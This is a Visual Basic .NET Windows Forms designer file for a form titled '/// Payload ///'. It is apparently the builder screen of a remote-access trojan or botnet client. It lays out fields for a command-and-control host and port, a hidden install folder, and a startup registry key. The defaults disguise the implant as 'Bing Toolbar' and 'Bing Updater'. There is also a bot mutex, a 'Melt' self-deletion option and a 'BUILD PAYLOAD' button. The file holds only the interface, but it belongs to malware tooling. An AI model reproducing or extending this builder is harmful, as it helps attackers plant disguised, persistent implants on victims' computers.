﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class frmBuild
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.txtC2 = New System.Windows.Forms.TextBox()
        Me.numPort = New System.Windows.Forms.NumericUpDown()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.txtPassword = New System.Windows.Forms.TextBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.chkDisplay = New System.Windows.Forms.CheckBox()
        Me.chkInstall = New System.Windows.Forms.CheckBox()
        Me.comboLocation = New System.Windows.Forms.ComboBox()
        Me.txtFolder = New System.Windows.Forms.TextBox()
        Me.chkFolder = New System.Windows.Forms.CheckBox()
        Me.txtFilename = New System.Windows.Forms.TextBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.chkStartup = New System.Windows.Forms.CheckBox()
        Me.txtRegkey = New System.Windows.Forms.TextBox()
        Me.txtMutex = New System.Windows.Forms.TextBox()
        Me.btnGenerate = New System.Windows.Forms.Button()
        Me.btnBuild = New System.Windows.Forms.Button()
        Me.chkUsg = New System.Windows.Forms.CheckBox()
        Me.chkMelt = New System.Windows.Forms.CheckBox()
        CType(Me.numPort, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(6, 7)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(45, 13)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "DNS/IP"
        '
        'txtC2
        '
        Me.txtC2.Location = New System.Drawing.Point(82, 4)
        Me.txtC2.Name = "txtC2"
        Me.txtC2.Size = New System.Drawing.Size(132, 20)
        Me.txtC2.TabIndex = 1
        '
        'numPort
        '
        Me.numPort.Location = New System.Drawing.Point(82, 28)
        Me.numPort.Maximum = New Decimal(New Integer() {65535, 0, 0, 0})
        Me.numPort.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.numPort.Name = "numPort"
        Me.numPort.Size = New System.Drawing.Size(132, 20)
        Me.numPort.TabIndex = 2
        Me.numPort.Value = New Decimal(New Integer() {13666, 0, 0, 0})
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(6, 30)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(26, 13)
        Me.Label2.TabIndex = 3
        Me.Label2.Text = "Port"
        '
        'txtPassword
        '
        Me.txtPassword.Location = New System.Drawing.Point(82, 52)
        Me.txtPassword.Name = "txtPassword"
        Me.txtPassword.Size = New System.Drawing.Size(132, 20)
        Me.txtPassword.TabIndex = 5
        Me.txtPassword.Text = "T0X1C_PWD_1337"
        Me.txtPassword.UseSystemPasswordChar = True
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(6, 55)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(53, 13)
        Me.Label3.TabIndex = 4
        Me.Label3.Text = "Password"
        '
        'chkDisplay
        '
        Me.chkDisplay.AutoSize = True
        Me.chkDisplay.Location = New System.Drawing.Point(82, 74)
        Me.chkDisplay.Name = "chkDisplay"
        Me.chkDisplay.Size = New System.Drawing.Size(60, 17)
        Me.chkDisplay.TabIndex = 6
        Me.chkDisplay.Text = "Display"
        Me.chkDisplay.UseVisualStyleBackColor = True
        '
        'chkInstall
        '
        Me.chkInstall.AutoSize = True
        Me.chkInstall.Location = New System.Drawing.Point(9, 99)
        Me.chkInstall.Name = "chkInstall"
        Me.chkInstall.Size = New System.Drawing.Size(53, 17)
        Me.chkInstall.TabIndex = 7
        Me.chkInstall.Text = "Install"
        Me.chkInstall.UseVisualStyleBackColor = True
        '
        'comboLocation
        '
        Me.comboLocation.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.comboLocation.FormattingEnabled = True
        Me.comboLocation.Items.AddRange(New Object() {"AppData\Roaming", "AppData\Microsoft", "User Profile", "Documents", "Downloads", "Favorites", "Temporary Files"})
        Me.comboLocation.Location = New System.Drawing.Point(82, 97)
        Me.comboLocation.Name = "comboLocation"
        Me.comboLocation.Size = New System.Drawing.Size(132, 21)
        Me.comboLocation.TabIndex = 8
        '
        'txtFolder
        '
        Me.txtFolder.Location = New System.Drawing.Point(82, 122)
        Me.txtFolder.Name = "txtFolder"
        Me.txtFolder.Size = New System.Drawing.Size(132, 20)
        Me.txtFolder.TabIndex = 9
        Me.txtFolder.Text = "Bing Toolbar 10.6.3.3"
        '
        'chkFolder
        '
        Me.chkFolder.AutoSize = True
        Me.chkFolder.Location = New System.Drawing.Point(9, 124)
        Me.chkFolder.Name = "chkFolder"
        Me.chkFolder.Size = New System.Drawing.Size(55, 17)
        Me.chkFolder.TabIndex = 10
        Me.chkFolder.Text = "Folder"
        Me.chkFolder.UseVisualStyleBackColor = True
        '
        'txtFilename
        '
        Me.txtFilename.Location = New System.Drawing.Point(82, 146)
        Me.txtFilename.Name = "txtFilename"
        Me.txtFilename.Size = New System.Drawing.Size(132, 20)
        Me.txtFilename.TabIndex = 12
        Me.txtFilename.Text = "setup_x86.exe"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(6, 149)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(56, 13)
        Me.Label4.TabIndex = 11
        Me.Label4.Text = "Exe Name"
        '
        'chkStartup
        '
        Me.chkStartup.AutoSize = True
        Me.chkStartup.Location = New System.Drawing.Point(9, 184)
        Me.chkStartup.Name = "chkStartup"
        Me.chkStartup.Size = New System.Drawing.Size(67, 17)
        Me.chkStartup.TabIndex = 13
        Me.chkStartup.Text = "Reg Key"
        Me.chkStartup.UseVisualStyleBackColor = True
        '
        'txtRegkey
        '
        Me.txtRegkey.Location = New System.Drawing.Point(82, 182)
        Me.txtRegkey.Name = "txtRegkey"
        Me.txtRegkey.Size = New System.Drawing.Size(132, 20)
        Me.txtRegkey.TabIndex = 14
        Me.txtRegkey.Text = "Bing Updater"
        '
        'txtMutex
        '
        Me.txtMutex.Location = New System.Drawing.Point(82, 206)
        Me.txtMutex.Name = "txtMutex"
        Me.txtMutex.Size = New System.Drawing.Size(132, 20)
        Me.txtMutex.TabIndex = 15
        Me.txtMutex.Text = "ZoMbiE_MuTeX_..."
        '
        'btnGenerate
        '
        Me.btnGenerate.BackColor = System.Drawing.Color.White
        Me.btnGenerate.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnGenerate.Font = New System.Drawing.Font("Microsoft Sans Serif", 6.0!)
        Me.btnGenerate.Location = New System.Drawing.Point(9, 206)
        Me.btnGenerate.Margin = New System.Windows.Forms.Padding(0)
        Me.btnGenerate.Name = "btnGenerate"
        Me.btnGenerate.Size = New System.Drawing.Size(70, 20)
        Me.btnGenerate.TabIndex = 16
        Me.btnGenerate.Text = "GET MUTEX"
        Me.btnGenerate.UseVisualStyleBackColor = False
        '
        'btnBuild
        '
        Me.btnBuild.BackColor = System.Drawing.Color.White
        Me.btnBuild.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnBuild.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.0!, System.Drawing.FontStyle.Bold)
        Me.btnBuild.Location = New System.Drawing.Point(9, 263)
        Me.btnBuild.Margin = New System.Windows.Forms.Padding(0)
        Me.btnBuild.Name = "btnBuild"
        Me.btnBuild.Size = New System.Drawing.Size(202, 36)
        Me.btnBuild.TabIndex = 17
        Me.btnBuild.Text = "BUILD PAYLOAD"
        Me.btnBuild.UseVisualStyleBackColor = False
        '
        'chkUsg
        '
        Me.chkUsg.AutoSize = True
        Me.chkUsg.Location = New System.Drawing.Point(9, 243)
        Me.chkUsg.Name = "chkUsg"
        Me.chkUsg.Size = New System.Drawing.Size(49, 17)
        Me.chkUsg.TabIndex = 18
        Me.chkUsg.Text = "USG"
        Me.chkUsg.UseVisualStyleBackColor = True
        '
        'chkMelt
        '
        Me.chkMelt.AutoSize = True
        Me.chkMelt.Location = New System.Drawing.Point(64, 243)
        Me.chkMelt.Name = "chkMelt"
        Me.chkMelt.Size = New System.Drawing.Size(46, 17)
        Me.chkMelt.TabIndex = 19
        Me.chkMelt.Text = "Melt"
        Me.chkMelt.UseVisualStyleBackColor = True
        '
        'frmBuild
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.SystemColors.ControlLight
        Me.ClientSize = New System.Drawing.Size(220, 308)
        Me.Controls.Add(Me.chkMelt)
        Me.Controls.Add(Me.chkUsg)
        Me.Controls.Add(Me.btnBuild)
        Me.Controls.Add(Me.btnGenerate)
        Me.Controls.Add(Me.txtMutex)
        Me.Controls.Add(Me.txtRegkey)
        Me.Controls.Add(Me.chkStartup)
        Me.Controls.Add(Me.txtFilename)
        Me.Controls.Add(Me.Label4)
        Me.Controls.Add(Me.chkFolder)
        Me.Controls.Add(Me.txtFolder)
        Me.Controls.Add(Me.comboLocation)
        Me.Controls.Add(Me.chkInstall)
        Me.Controls.Add(Me.txtPassword)
        Me.Controls.Add(Me.chkDisplay)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.numPort)
        Me.Controls.Add(Me.txtC2)
        Me.Controls.Add(Me.Label1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.Name = "frmBuild"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "/// Payload ///"
        Me.TopMost = True
        CType(Me.numPort, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents Label1 As Label
    Friend WithEvents txtC2 As TextBox
    Friend WithEvents numPort As NumericUpDown
    Friend WithEvents Label2 As Label
    Friend WithEvents txtPassword As TextBox
    Friend WithEvents Label3 As Label
    Friend WithEvents chkDisplay As CheckBox
    Friend WithEvents chkInstall As CheckBox
    Friend WithEvents comboLocation As ComboBox
    Friend WithEvents txtFolder As TextBox
    Friend WithEvents chkFolder As CheckBox
    Friend WithEvents txtFilename As TextBox
    Friend WithEvents Label4 As Label
    Friend WithEvents chkStartup As CheckBox
    Friend WithEvents txtRegkey As TextBox
    Friend WithEvents txtMutex As TextBox
    Friend WithEvents btnGenerate As Button
    Friend WithEvents btnBuild As Button
    Friend WithEvents chkUsg As CheckBox
    Friend WithEvents chkMelt As CheckBox
End Class
